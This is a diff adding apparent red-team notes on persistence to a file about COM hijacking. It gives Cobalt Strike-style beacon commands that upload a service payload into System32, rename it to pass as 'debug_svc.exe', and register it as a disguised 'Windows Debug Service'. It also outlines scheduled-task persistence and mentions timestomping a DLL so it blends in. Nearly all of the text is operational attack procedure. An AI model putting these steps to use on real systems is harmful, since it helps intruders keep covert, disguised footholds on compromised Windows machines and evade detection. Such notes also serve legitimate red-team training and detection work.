@@ -45,5 +45,28 @@ Procmon filters to find com hijacking
 - The Result is NAME NOT FOUND
 Rename and timestomp the DLL to help it blend in.
 
+-----------------------------------------------------
+
+Elevated Persistence
+
+Scheduled Task:
+c\windows\system32
+upload payload
+schtaskscreate \Beacon XML CREATE
+
+-----------------------------------------------------
+
+Windows Service (must use a svc beacon)
+
+beacon> cd C:\Windows\System32\
+beacon> upload C:\Payloads\beacon_x64.svc.exe
+beacon> mv beacon_x64.svc.exe debug_svc.exe
+
+beacon> sc_create NAME_SERVICE_HERE "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
+
+sc_query Name_Service_Here
+
+-----------------------------------------------------
+
 
 
